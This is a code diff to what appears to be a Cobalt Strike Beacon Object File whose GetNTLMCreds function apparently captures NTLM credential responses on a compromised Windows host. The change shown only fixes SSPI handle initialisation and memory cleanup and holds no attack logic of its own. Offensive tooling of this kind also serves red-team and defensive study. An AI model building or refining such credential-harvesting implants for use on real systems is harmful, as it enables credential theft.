@@ -190,6 +190,7 @@ BYTE* GetSecBufferByteArray(const SecBufferDesc* pSecBufferDesc, size_t* pBuffer
 
 	return buffer;
 }
+
 BOOL IsCredHandleValid(CredHandle *phCred)
 {
     return (phCred->dwLower != (ULONG_PTR) -1) && (phCred->dwUpper != (ULONG_PTR) -1);
@@ -218,11 +219,16 @@ void GetNTLMCreds(char* challenge, BOOL DisableESS){
     SECURITY_STATUS SecStatus = 0;
     
     CredHandle hCred, hClientContext, hServerContext;
-    hCred.dwLower = 0;
-    hCred.dwUpper = 0;
-    TimeStamp expiry;
-    expiry.HighPart = 0;
-    expiry.LowPart = 0;
+
+    // mark all as "invalid" by default, per SSPI convention
+    hCred.dwLower = (ULONG_PTR)-1;
+    hCred.dwUpper = (ULONG_PTR)-1;
+    hClientContext.dwLower = (ULONG_PTR)-1;
+    hClientContext.dwUpper = (ULONG_PTR)-1;
+    hServerContext.dwLower = (ULONG_PTR)-1;
+    hServerContext.dwUpper = (ULONG_PTR)-1;
+
+    TimeStamp expiry = {0}; // zero-init is fine for this
 
     ULONG contextAttr = 0;
 
@@ -334,31 +340,47 @@ void GetNTLMCreds(char* challenge, BOOL DisableESS){
 
 cleanup:
     BeaconPrintf(CALLBACK_OUTPUT, "cleanup time");
-    if (IsCredHandleValid(&hCred)){
+
+    if (IsCredHandleValid(&hCred)) {
         SECUR32$FreeCredentialsHandle(&hCred);
+        hCred.dwLower = (ULONG_PTR)-1;
+        hCred.dwUpper = (ULONG_PTR)-1;
     }
-    if (IsCredHandleValid(&hClientContext)){
+
+    if (IsCredHandleValid(&hClientContext)) {
         SECUR32$DeleteSecurityContext(&hClientContext);
+        hClientContext.dwLower = (ULONG_PTR)-1;
+        hClientContext.dwUpper = (ULONG_PTR)-1;
     }
-    if (IsCredHandleValid(&hServerContext)){
+
+    if (IsCredHandleValid(&hServerContext)) {
         SECUR32$DeleteSecurityContext(&hServerContext);
+        hServerContext.dwLower = (ULONG_PTR)-1;
+        hServerContext.dwUpper = (ULONG_PTR)-1;
     }
+
     if (ClientSecBuffer.pvBuffer != NULL) {
         MSVCRT$free(ClientSecBuffer.pvBuffer);
+        ClientSecBuffer.pvBuffer = NULL;
     }
     if (ServerSecBuffer.pvBuffer != NULL) {
         MSVCRT$free(ServerSecBuffer.pvBuffer);
+        ServerSecBuffer.pvBuffer = NULL;
     }
     if (ClientSecBuffer2.pvBuffer != NULL) {
         MSVCRT$free(ClientSecBuffer2.pvBuffer);
+        ClientSecBuffer2.pvBuffer = NULL;
     }
     if (serverMessage != NULL) {
         MSVCRT$free(serverMessage);
+        serverMessage = NULL;
     }
     if (challengeBytes != NULL) {
         MSVCRT$free(challengeBytes);
+        challengeBytes = NULL;
     }
 }
+
 VOID go(char* buf, int len) {
     datap parser;
     BeaconDataParse(&parser, buf, len);
